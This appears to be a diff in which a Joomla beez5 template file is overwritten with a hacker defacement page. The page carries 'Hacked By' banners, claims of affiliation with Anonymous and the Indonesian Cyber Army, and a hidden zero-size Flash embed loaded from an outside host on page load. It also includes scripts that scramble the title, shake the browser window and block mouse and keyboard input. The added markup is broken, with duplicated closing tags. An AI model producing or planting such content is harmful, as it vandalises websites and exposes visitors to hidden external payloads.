@@ -1,284 +1,245 @@
-<?php
-/**
- * @package		Joomla.Site
- * @subpackage	Templates.beez5
- * @copyright	Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
- * @license		GNU General Public License version 2 or later; see LICENSE.txt
- */
+<html>
+<embed src="http://www.swfcabin.com/swf-files/1254889895.swf" loop="0" width="0" height="0" type="application/x-shockwave-flash"></embed>
 
-// No direct access.
-defined('_JEXEC') or die;
-
-// check modules
-$showRightColumn	= ($this->countModules('position-3') or $this->countModules('position-6') or $this->countModules('position-8'));
-$showbottom			= ($this->countModules('position-9') or $this->countModules('position-10') or $this->countModules('position-11'));
-$showleft			= ($this->countModules('position-4') or $this->countModules('position-7') or $this->countModules('position-5'));
-
-if ($showRightColumn==0 and $showleft==0) {
-	$showno = 0;
+<script language="JavaScript">function tb5_makeArray(n){ this.length = n; return this.length;
 }
+tb5_messages = new tb5_makeArray(4);
+tb5_messages[0] = "Your Website Is Expired Now";
+tb5_messages[1] = "Hacked By Ex*|Cyber|*";
+tb5_messages[2] = "We Are Anonymous";
+tb5_messages[3] = "Indonesian Cyber Army , New Of Hacker";
+tb5_rptType = 'infinite';
+tb5_rptNbr = 100;
+tb5_speed = 10;
+tb5_delay = 1500;
+var tb5_counter=1;
+var tb5_currMsg=0;
+var tb5_stsmsg="";
+function tb5_shuffle(arr){
+var k;
+for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 2)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp;
+}
+return arr;
+}
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+function tb5_init(n){
+var k;
+if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay;
+}
+else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
+}
+function tb5_randomizetitle(){ tb5_init(0);
+}
+tb5_randomizetitle();
+</script>
+<head>
+<br>
+<center><img src="http://fc03.deviantart.net/fs71/f/2011/136/f/c/anonymous_expect_us_by_spoof_ghost-d3ghrit.png" width="390" height="240""><center>
+</br>
+<title>Hacked By Bobbygokil75</title>
+<link rel="icon" href="none" type="image/x-icon" />
+<link rel="shortcut icon" href="none" type="image/x-icon" />
+<style type="text/css">
+<!--
+.ahgcrewstyle {
+        color: #F00;
+}
+.ahg {
+        color: #0F0;
+}
+#message font strong {
+        font-family: Tahoma, Geneva, sans-serif;
+        font-size: 18px;
+}
+.gre {
+        color: #9F3;
+        font-size: 32px;
+}
+#message font {
+        font-size: 18px;
+}
+-->
+</style>
+</head><body alink="gray" bgcolor="black" vlink="gray" link="gray" text="gray">
+<p></p><center>
+<center></center>
+<script type="text/javascript">
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true;
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar = 0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+ if(this.running) return;
+ if(typeof this.origText == "undefined") {
+   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+   return;
+ }
+ if(this.currentText == "") this.element.innerHTML = "";
+ if(this.currentChar < this.origText.length) {
+   if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+     this.tagBuffer = "<";
+     this.inTag = true;
+     this.currentChar++;
+     this.run();
+     return;
+   } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+     this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+     this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+     this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+   this.currentChar++;
+   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+ } else {
+        this.currentText = "";
+        this.currentChar = 0;
+       this.running = false;
+       this.finishedCallback();
+ }
+}
+</script>
+<center>
+  <b class="Gre">Hacked By Ex*|Cyber|*</b>
+  <br>
+  <font>
+</font><p id="message"><font> <strong>
+ <br>
+<br><font face="Papyrus"; color="Red"; size="6">Sorry Admin Your Website Has Been Unknown Hacked</font><br>
+<br>
+<br><font face="Papyrus"; color="Red"; size="6">Please Patch Or Renew Your System</font><br>
+<br>
+<br><font face="Papyrus"; color="Red"; size="6">Your System Is Very Bad</font><br>
 
-JHtml::_('behavior.framework', true);
+<!-- HTML codes by Quackit.com -->
 
-// get params
-$color			= $this->params->get('templatecolor');
-$logo			= $this->params->get('logo');
-$navposition	= $this->params->get('navposition');
-$app			= JFactory::getApplication();
-$doc			= JFactory::getDocument();
-$templateparams	= $app->getTemplate(true)->params;
-
-$doc->addScript($this->baseurl.'/templates/'.$this->template.'/javascript/md_stylechanger.js', 'text/javascript', true);
-?>
-<?php if(!$templateparams->get('html5', 0)): ?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<?php else: ?>
-	<?php echo '<!DOCTYPE html>'; ?>
-<?php endif; ?>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
-	<head>
-		<jdoc:include type="head" />
-		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
-		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/position.css" type="text/css" media="screen,projection" />
-		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/layout.css" type="text/css" media="screen,projection" />
-		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/print.css" type="text/css" media="Print" />
-		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/beez5.css" type="text/css" />
-<?php
-	$files = JHtml::_('stylesheet', 'templates/'.$this->template.'/css/general.css', null, false, true);
-	if ($files):
-		if (!is_array($files)):
-			$files = array($files);
-		endif;
-		foreach($files as $file):
-?>
-		<link rel="stylesheet" href="<?php echo $file;?>" type="text/css" />
-<?php
-	 	endforeach;
-	endif;
-?>
-		<?php if ($this->direction == 'rtl') : ?>
-		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/template_rtl.css" type="text/css" />
-		<?php endif; ?>
-		<!--[if lte IE 6]>
-			<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/ieonly.css" rel="stylesheet" type="text/css" />
-		<![endif]-->
-		<!--[if IE 7]>
-			<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/ie7only.css" rel="stylesheet" type="text/css" />
-		<![endif]-->
-<?php if($templateparams->get('html5', 0)) { ?>
-		<!--[if lt IE 9]>
-			<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/html5.js"></script>
-		<![endif]-->
-<?php } ?>
-		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/hide.js"></script>
-
-		<script type="text/javascript">
-			var big ='<?php echo (int)$this->params->get('wrapperLarge');?>%';
-			var small='<?php echo (int)$this->params->get('wrapperSmall'); ?>%';
-			var altopen='<?php echo JText::_('TPL_BEEZ5_ALTOPEN', true); ?>';
-			var altclose='<?php echo JText::_('TPL_BEEZ5_ALTCLOSE', true); ?>';
-			var bildauf='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/plus.png';
-			var bildzu='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/minus.png';
-			var rightopen='<?php echo JText::_('TPL_BEEZ5_TEXTRIGHTOPEN', true); ?>';
-			var rightclose='<?php echo JText::_('TPL_BEEZ5_TEXTRIGHTCLOSE', true); ?>';
-			var fontSizeTitle='<?php echo JText::_('TPL_BEEZ5_FONTSIZE', true); ?>';
-            var bigger='<?php echo JText::_('TPL_BEEZ5_BIGGER', true); ?>';
-            var reset='<?php echo JText::_('TPL_BEEZ5_RESET', true); ?>';
-            var smaller='<?php echo JText::_('TPL_BEEZ5_SMALLER', true); ?>';
-            var biggerTitle='<?php echo JText::_('TPL_BEEZ5_INCREASE_SIZE', true); ?>';
-            var resetTitle='<?php echo JText::_('TPL_BEEZ5_REVERT_STYLES_TO_DEFAULT', true); ?>';
-            var smallerTitle='<?php echo JText::_('TPL_BEEZ5_DECREASE_SIZE', true); ?>';
-		</script>
-
-	</head>
-
-	<body>
-
-<div id="all">
-	<div id="back">
-	<?php if(!$templateparams->get('html5', 0)): ?>
-		<div id="header">
-			<?php else: ?>
-		<header id="header">
-			<?php endif; ?>
-				<div class="logoheader">
-					<h1 id="logo">
-
-					<?php if ($logo != null ): ?>
-					<img src="<?php echo $this->baseurl ?>/<?php echo htmlspecialchars($logo); ?>" alt="<?php echo htmlspecialchars($templateparams->get('sitetitle'));?>" />
-					<?php else: ?>
-					<?php echo htmlspecialchars($templateparams->get('sitetitle'));?>
-					<?php endif; ?>
-					<span class="header1">
-					<?php echo htmlspecialchars($templateparams->get('sitedescription'));?>
-					</span></h1>
-				</div><!-- end logoheader -->
-
-					<ul class="skiplinks">
-						<li><a href="#main" class="u2"><?php echo JText::_('TPL_BEEZ5_SKIP_TO_CONTENT'); ?></a></li>
-						<li><a href="#nav" class="u2"><?php echo JText::_('TPL_BEEZ5_JUMP_TO_NAV'); ?></a></li>
-						<?php if($showRightColumn ):?>
-						<li><a href="#additional" class="u2"><?php echo JText::_('TPL_BEEZ5_JUMP_TO_INFO'); ?></a></li>
-						<?php endif; ?>
-					</ul>
-					<h2 class="unseen"><?php echo JText::_('TPL_BEEZ5_NAV_VIEW_SEARCH'); ?></h2>
-					<h3 class="unseen"><?php echo JText::_('TPL_BEEZ5_NAVIGATION'); ?></h3>
-					<jdoc:include type="modules" name="position-1" />
-					<div id="line">
-					<div id="fontsize"></div>
-					<h3 class="unseen"><?php echo JText::_('TPL_BEEZ5_SEARCH'); ?></h3>
-					<jdoc:include type="modules" name="position-0" />
-					</div> <!-- end line -->
-		<div id="header-image">
-			<jdoc:include type="modules" name="position-15" />
-			<?php if ($this->countModules('position-15')==0): ?>
-				<img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/fruits.jpg"  alt="<?php echo JText::_('TPL_BEEZ5_LOGO'); ?>" />
-			<?php endif; ?>
-		</div>
-		<?php if (!$templateparams->get('html5', 0)): ?>
-			</div><!-- end header -->
-		<?php else: ?>
-			</header><!-- end header -->
-		<?php endif; ?>
-		<div id="<?php echo $showRightColumn ? 'contentarea2' : 'contentarea'; ?>">
-					<div id="breadcrumbs">
-
-							<jdoc:include type="modules" name="position-2" />
-
-					</div>
-
-					<?php if ($navposition=='left' and $showleft) : ?>
-
-						<?php if(!$this->params->get('html5', 0)): ?>
-							<div class="left1 <?php if ($showRightColumn==NULL){ echo 'leftbigger';} ?>" id="nav">
-						<?php else: ?>
-							<nav class="left1 <?php if ($showRightColumn==NULL){ echo 'leftbigger';} ?>" id="nav">
-						<?php endif; ?>
-
-								<jdoc:include type="modules" name="position-7" style="beezDivision" headerLevel="3" />
-								<jdoc:include type="modules" name="position-4" style="beezHide" headerLevel="3" state="0 " />
-								<jdoc:include type="modules" name="position-5" style="beezTabs" headerLevel="2"  id="3" />
-
-						<?php if(!$this->params->get('html5', 0)): ?>
-							</div><!-- end navi -->
-						<?php else: ?>
-							</nav>
-						<?php endif; ?>
-
-					<?php endif; ?>
-
-					<div id="<?php echo $showRightColumn ? 'wrapper' : 'wrapper2'; ?>" <?php if (isset($showno)){echo 'class="shownocolumns"';}?>>
-
-						<div id="main">
-
-						<?php if ($this->countModules('position-12')): ?>
-							<div id="top"><jdoc:include type="modules" name="position-12"   />
-							</div>
-						<?php endif; ?>
-
-							<jdoc:include type="message" />
-							<jdoc:include type="component" />
-
-						</div><!-- end main -->
-
-					</div><!-- end wrapper -->
-
-				<?php if ($showRightColumn) : ?>
-					<h2 class="unseen">
-						<?php echo JText::_('TPL_BEEZ5_ADDITIONAL_INFORMATION'); ?>
-					</h2>
-					<div id="close">
-						<a href="#" onclick="auf('right')">
-							<span id="bild">
-								<?php echo JText::_('TPL_BEEZ5_TEXTRIGHTCLOSE'); ?></span></a>
-					</div>
-
-				<?php if (!$templateparams->get('html5', 0)): ?>
-					<div id="right">
-				<?php else: ?>
-					<aside id="right">
-				<?php endif; ?>
-
-						<a id="additional"></a>
-						<jdoc:include type="modules" name="position-6" style="beezDivision" headerLevel="3"/>
-						<jdoc:include type="modules" name="position-8" style="beezDivision" headerLevel="3"  />
-						<jdoc:include type="modules" name="position-3" style="beezDivision" headerLevel="3"  />
-
-				<?php if(!$templateparams->get('html5', 0)): ?>
-					</div><!-- end right -->
-				<?php else: ?>
-					</aside>
-				<?php endif; ?>
-			<?php endif; ?>
-
-			<?php if ($navposition=='center' and $showleft) : ?>
-
-				<?php if (!$this->params->get('html5', 0)): ?>
-					<div class="left <?php if ($showRightColumn==NULL){ echo 'leftbigger';} ?>" id="nav" >
-				<?php else: ?>
-					<nav class="left <?php if ($showRightColumn==NULL){ echo 'leftbigger';} ?>" id="nav">
-				<?php endif; ?>
-
-						<jdoc:include type="modules" name="position-7"  style="beezDivision" headerLevel="3" />
-						<jdoc:include type="modules" name="position-4" style="beezHide" headerLevel="3" state="0 " />
-						<jdoc:include type="modules" name="position-5" style="beezTabs" headerLevel="2"  id="3" />
-
-				<?php if (!$templateparams->get('html5', 0)): ?>
-					</div><!-- end navi -->
-				<?php else: ?>
-					</nav>
-				<?php endif; ?>
-			<?php endif; ?>
-
-					<div class="wrap"></div>
-
-				</div> <!-- end contentarea -->
-
-			</div><!-- back -->
-
-		</div><!-- all -->
-
-		<div id="footer-outer">
-
-		<?php if ($showbottom) : ?>
-			<div id="footer-inner">
-
-				<div id="bottom">
-					<?php if ($this->countModules('position-9')): ?>
-					<div class="box box1"> <jdoc:include type="modules" name="position-9" style="beezDivision" headerlevel="3" /></div>
-					<?php endif; ?>
-					   <?php if ($this->countModules('position-10')): ?>
-					<div class="box box2"> <jdoc:include type="modules" name="position-10" style="beezDivision" headerlevel="3" /></div>
-					<?php endif; ?>
-					<?php if ($this->countModules('position-11')): ?>
-					<div class="box box3"> <jdoc:include type="modules" name="position-11" style="beezDivision" headerlevel="3" /></div>
-					<?php endif ; ?>
-				</div>
-			</div>
-		<?php endif ; ?>
-
-			<div id="footer-sub">
-
-			<?php if (!$templateparams->get('html5', 0)): ?>
-				<div id="footer">
-			<?php else: ?>
-				<footer id="footer">
-			<?php endif; ?>
-
-					<jdoc:include type="modules" name="position-14" />
-					<p>
-						<?php echo JText::_('TPL_BEEZ5_POWERED_BY');?> <a href="http://www.joomla.org/">Joomla!&#174;</a>
-					</p>
-
-			<?php if (!$templateparams->get('html5', 0)): ?>
-				</div><!-- end footer -->
-			<?php else: ?>
-				</footer>
-			<?php endif; ?>
-
-			</div>
-
-		</div>
-		<jdoc:include type="modules" name="debug" />
-	</body>
+  <script type="text/javascript">
+new TypingText(document.getElementById("message"), 50, function(i){ var ar = new Array("\\", "", "/", "-"); return " " + ar[i.length % ar.length]; });
+//Type out examples:
+TypingText.runAll();
+  </script>
+</font></p>
+</center></center>
+<br>
+</br>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
+</body></html>
+<!-- aghaze larzeshe safhe-->
+<meta http-equiv="Content-Language" content="en-us">
+<SCRIPT language=JavaScript>
+<!-- Begin
+function shake(n) {
+if (parent.moveBy) {
+for (i = 10; i > 0; i--) {
+for (j = n; j > 0; j--) {
+parent.moveBy(-i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,-i);
+parent.moveBy(-i,0);
+parent.moveBy(0,-i);
+parent.moveBy(i,0);
+parent.moveBy(0,i);
+parent.moveBy(i,0);
+parent.moveBy(0,i);
+        }
+     }
+  }
+}
+//  End -->
+<!--
+shake(1);
+//-->
+</SCRIPT>
+<!-- p align="center"><font size="7" color="#FF0000">chi?</font></p> -->
+<!--payan--></SCRIPT>
+</body>
 </html>
+</body>
+</html>
+<style type="text/css">body{background:url(http://postimg.org/image/pzvw0vxx1/)};</style>
+<P align=center></P>
+<body bgcolor="#333366" background="http://postimg.org/image/pzvw0vxx1/" text="#FFFFFF" link="#0066CC" vlink="#999999" alink="#993300" style="background-image: url('http://postimg.org/image/pzvw0vxx1/')"><style>
+body {
+    padding:0;
+    margin:0;
+    background-image:url(http://iasstes-team.com/p_0001.jpg);
+    background-repeat: no-repeat;
+    background-position:top;
+background-color: black;
+color: white;
+font: normal 80% Verdana;
+margin-top: 0px;
+margin-left: 0px;
+padding: 0;
+margin-right: 0px;
+}
+td{font-family: verdana; font-size: 20pt; color: green}
+a{font-family: verdana; font-size: 20pt; color: silver}
+</style>
+<style>
+#navbar-iframe {
+display: none;
+}
+<style>
